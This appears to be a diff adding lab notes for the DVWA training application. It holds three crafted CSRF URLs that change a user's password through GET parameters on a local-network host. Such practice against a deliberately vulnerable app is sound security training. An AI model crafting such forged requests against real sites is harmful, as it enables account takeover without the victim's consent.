@@ -1,0 +1,9 @@
+http://192.168.1.15/dvwa/vulnerabilities/csrf/?password_current=password&password_new=123&password_conf=123&Change=Change#
+
+http://192.168.1.15/dvwa/vulnerabilities/csrf/?password_current=123&password_new=1234&password_conf=1234&Change=Change#
+
+http://192.168.1.15/dvwa/vulnerabilities/csrf/?password_current=1234&password_new=12345&password_conf=12345&Change=Change#
+
+
+
+
